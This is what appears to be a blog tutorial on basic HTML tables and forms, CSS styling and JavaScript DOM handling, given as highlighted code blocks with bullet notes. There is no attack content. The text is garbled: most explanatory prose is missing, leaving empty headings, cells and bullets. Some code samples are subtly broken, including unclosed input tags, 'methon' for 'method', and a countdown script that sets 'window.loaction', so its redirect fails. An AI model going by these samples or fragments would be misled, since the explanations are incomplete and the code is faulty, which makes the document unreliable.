class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">border</span>=<span class=\"string\">&quot;1&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;600px&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">caption</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">caption</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">th</span> <span class=\"attr\">colspan</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>2021001<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>tr</code><code>th</code><code>td</code>()</li>\n<li><code>colspan=3</code>3</li>\n<li><code>rowspan=4</code>4</li>\n</ul>\n<h4 id=\"form\"><a href=\"#form\" class=\"headerlink\" title=\"form\"></a>form</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;data.html&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;get&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;nusername&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &lt;<span class=\"attr\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pwd&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;&quot;</span>&lt;<span class=\"attr\">br</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;reset&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"attr\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>http://127.0.0.1:5500/data.html?nusername=123&amp;pwd=456</code>data.html**<u>&amp;</u>**</li>\n<li><code>action=xxxx.xxxx</code><strong>xxxx.xxxx</strong></li>\n<li><code>methon=&#39;get&#39;</code><code>get</code><code>post</code></li>\n</ul>\n<h4 id=\"form\"><a href=\"#form\" class=\"headerlink\" title=\"form\"></a>form</h4><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;liulei&quot;</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot;&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">        &lt;<span class=\"attr\">br</span>/&gt;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;pwd&quot;</span> <span class=\"attr\">maxlength</span>=<span class=\"string\">&quot;8&quot;</span> <span class=\"attr\">placeholder</span>=<span class=\"string\">&quot;8&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"attr\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>name=&quot;username&quot;</code>url<strong>username</strong></li>\n<li><code>value=liulei</code> <code></code></li>\n<li><code>title=</code>**<u></u>**</li>\n<li><code>maxlength=8</code>8</li>\n<li><code>placeholder=&quot;8&quot;</code>**<u>8</u>**</li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;master&quot;</span> <span class=\"attr\">size</span>=<span class=\"string\">&quot;4&quot;</span> <span class=\"attr\">multiple</span>=<span class=\"string\">&quot;multiple&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span>.NET<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;1&quot;</span>&gt;</span>J2EE<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;2&quot;</span>&gt;</span>Java<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;3&quot;</span>&gt;</span>Android<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;4&quot;</span>&gt;</span>C<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>size</code> </li>\n<li><code>multiple=&quot;multiple&quot;</code></li>\n<li><code>value</code><strong>JAVA</strong><strong>master&#x3D;2</strong></li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;myfile&quot;</span> <span class=\"attr\">accept</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450148.png\"\n                        alt=\"\"\n                 ></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;date&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;mydate&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151450996.png\"\n                       \n                 ></p>\n<h2 id=\"3-css\"><a href=\"#3-css\" class=\"headerlink\" title=\"3.css\"></a>3.css</h2><h4 id=\"-CSS\"><a href=\"#-CSS\" class=\"headerlink\" title=\" CSS\"></a> CSS</h4><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151451939.png\"\n                        alt=\"-1667485429884\"\n                 ></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><table>\n<thead>\n<tr>\n<th></th>\n<th>10000</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>style</td>\n<td>1000</td>\n</tr>\n<tr>\n<td>id</td>\n<td>100</td>\n</tr>\n<tr>\n<td></td>\n<td>10</td>\n</tr>\n<tr>\n<td></td>\n<td>1</td>\n</tr>\n<tr>\n<td></td>\n<td>0</td>\n</tr>\n</tbody></table>\n<p><strong></strong></p>\n<h4 id=\"CSS--2-\"><a href=\"#CSS--2-\" class=\"headerlink\" title=\"CSS  2 \"></a>CSS  2 </h4><h5 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h5><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>:lightgrey;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>:<span class=\"number\">130px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">border-left</span>:<span class=\"number\">20px</span> solid green <span class=\"comment\">/**/</span></span><br><span class=\"line\">\tborder-radius:<span class=\"number\">5px</span>;<span class=\"comment\">/**/</span></span><br><span class=\"line\">\t<span class=\"attribute\">padding</span>:<span class=\"number\">10px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">margin</span>:<span class=\"number\">30px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">div</span><span class=\"selector-pseudo\">:hover</span>&#123;</span><br><span class=\"line\">\t<span class=\"attribute\">background-color</span>:<span class=\"built_in\">rgb</span>(<span class=\"number\">151</span>,<span class=\"number\">248</span>,<span class=\"number\">39</span>);</span><br><span class=\"line\">\t<span class=\"attribute\">cursor</span>:pointer;</span><br><span class=\"line\">\t<span class=\"attribute\">box-shadow</span>:<span class=\"number\">3px</span> <span class=\"number\">3px</span> <span class=\"number\">5px</span> <span class=\"number\">1px</span> <span class=\"built_in\">rgba</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0.2</span>);<span class=\"comment\">/**/</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;<span class=\"selector-tag\">div</span>&gt;&lt;/<span class=\"selector-tag\">div</span>&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>background-color</code></li>\n<li><code>width</code></li>\n<li><code>border-left</code></li>\n<li><code>border-radius</code></li>\n<li><code>padding</code></li>\n<li><code>margin</code></li>\n<li><code>hover</code></li>\n<li><code>cursor:pointer</code></li>\n<li><code>box-shadow</code>  X Y </li>\n</ul>\n<h5 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;nav&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#home&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#news&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#contact&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;#about&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-class\">.nav</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">list-style-type</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">float</span>: left;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:link</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:visited</span> &#123;</span><br><span class=\"line\">        <span class=\"attribute\">display</span>: block;</span><br><span class=\"line\">        <span class=\"attribute\">width</span>: <span class=\"number\">120px</span>;</span><br><span class=\"line\">        <span class=\"attribute\">text-align</span>: center;</span><br><span class=\"line\">        <span class=\"attribute\">padding</span>: <span class=\"number\">4px</span>;</span><br><span class=\"line\">        <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">        <span class=\"attribute\">background-color</span>: <span class=\"number\">#98bf21</span>;</span><br><span class=\"line\">        <span class=\"attribute\">text-decoration</span>: none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:hover</span>,</span><br><span class=\"line\"><span class=\"selector-class\">.nav</span> <span class=\"selector-tag\">li</span> <span class=\"selector-tag\">a</span><span class=\"selector-pseudo\">:active</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#7a991a</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>float:left</code></li>\n<li><code>list-style-type</code></li>\n<li><code>a:link</code></li>\n<li><code>a:visited</code></li>\n<li><code>display:block</code></li>\n<li><code>text-align</code></li>\n<li><code>text-decoration</code></li>\n</ul>\n<h2 id=\"4-JavaScript\"><a href=\"#4-JavaScript\" class=\"headerlink\" title=\"4.JavaScript\"></a>4.JavaScript</h2><h4 id=\"-js\"><a href=\"#-js\" class=\"headerlink\" title=\" js\"></a> js</h4><ul>\n<li>JS**<u></u>**</li>\n<li>JS**<u></u>**</li>\n<li>JS**<u></u>**</li>\n<li>JS**<u></u>**</li>\n</ul>\n<h4 id=\"JS\"><a href=\"#JS\" class=\"headerlink\" title=\"JS\"></a>JS</h4><p><strong><code>=&gt;</code>lambda</strong></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> foo=<span class=\"keyword\">function</span>(<span class=\"params\">num</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num+<span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">let</span> a=<span class=\"title function_\">foo</span>(<span class=\"number\">100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> <span class=\"title function_\">foo</span> =(<span class=\"params\">num</span>)=&gt;num+<span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>JS mapreducejoinslicesplicepushpopshiftunshift </strong></p>\n<p><strong>JS </strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;ok&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> btn=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;ok&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    btn.<span class=\"property\">disabled</span>=<span class=\"literal\">true</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> t=<span class=\"number\">3</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">function</span> <span class=\"title function_\">count</span>(<span class=\"params\"></span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        t--;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        btn.<span class=\"property\">innerHTML</span>=t+<span class=\"string\">&quot;&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">if</span>(t&lt;=<span class=\"number\">0</span>)&#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"built_in\">clearInterval</span>(id);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            btn.<span class=\"property\">disabled</span>=<span class=\"literal\">false</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            btn.<span class=\"property\">innerHTML</span>=<span class=\"string\">&quot;&quot;</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> url=<span class=\"variable language_\">window</span>.<span class=\"property\">location</span>;</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">window</span>.<span class=\"property\">loaction</span>=<span class=\"string\">&quot;https://www.wust.edu.cn&quot;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">let</span> id = <span class=\"built_in\">setInterval</span>(count,<span class=\"number\">1000</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>document.getElementById</code> ID </li>\n<li><code>btn.disabled</code></li>\n<li><code>btn.innerHTML</code>  HTML</li>\n<li><code>setInterval</code></li>\n<li><code>clearInterval</code> setInterval() </li>\n<li><code>window.loaction</code></li>\n</ul>\n<h4 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h4><p><strong>DOM:</strong></p>\n<p><strong>DOM</strong></p>\n<h4 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h4><h5 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h5><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;list&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>1<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>2<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;item&quot;</span>&gt;</span>3<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> list = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;list&#x27;</span>) <span class=\"comment\">// id=&quot;list&quot;#css</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(list.<span class=\"property\">innerHTML</span>) <span class=\"comment\">//HTML</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> first = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;.item&#x27;</span>) <span class=\"comment\">//  class=&quot;item&quot; class</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(first.<span class=\"property\">innerHTML</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> second = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;.item:nth-child(2)&#x27;</span>) <span class=\"comment\">//  .item css</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(second.<span class=\"property\">innerHTML</span>)</span><br><span class=\"line\"><span class=\"keyword\">let</span> items = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&#x27;.item&#x27;</span>) <span class=\"comment\">//  .item NodeList</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(items.<span class=\"property\">length</span>) <span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( <span class=\"keyword\">let</span> el <span class=\"keyword\">of</span> items ) &#123; <span 